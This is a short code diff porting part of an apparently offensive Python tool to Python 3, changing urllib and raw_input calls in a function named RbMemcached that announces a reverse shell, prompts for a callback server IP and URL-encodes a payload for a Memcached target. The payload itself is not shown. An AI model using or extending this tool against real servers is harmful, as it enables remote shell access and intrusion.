@@ -1,9 +1,9 @@
-import urllib
+from urllib import parse
 
 
 def RbMemcached():
     print("\033[01m" + "\nReady to Get Reverse SHELL\n" + "\033[0m")
-    server = raw_input(
+    server = input(
         "\033[96m"
         + "Give server IP you want to connect (default is 127.0.0.1): "
         + "\033[0m"
@@ -31,7 +31,7 @@ def RbMemcached():
     def get_payload(payload):
         payload_len = len(payload)
         payload = (
-            urllib.quote_plus(payload)
+            parse.quote_plus(payload)
             .replace("+", "%20")
             .replace("%2F", "/")
             .replace("%25", "%")
